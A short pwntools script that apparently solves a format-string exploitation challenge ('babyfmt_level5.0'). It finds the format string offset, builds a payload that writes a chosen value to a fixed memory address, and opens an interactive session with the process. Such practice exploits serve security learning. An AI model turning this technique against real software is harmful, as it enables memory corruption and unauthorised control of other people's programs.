from pwn import *

context.arch = 'amd64'

def exec_fmt(payload):
    p = process("/challenge/babyfmt_level5.0")
    p.recv()
    p.send(payload)
    result = p.recvall()
    print(result)
    return result

fmtstr = FmtStr(exec_fmt)
print("fmtstr offset: {}".format(fmtstr.offset))
padding = b"A" * fmtstr.padlen

p = process("/challenge/babyfmt_level5.0")
payload = padding + fmtstr_payload(fmtstr.offset, {0x404148: 0x190192289119DBA1})
print(payload)
p.send(payload)
p.interactive()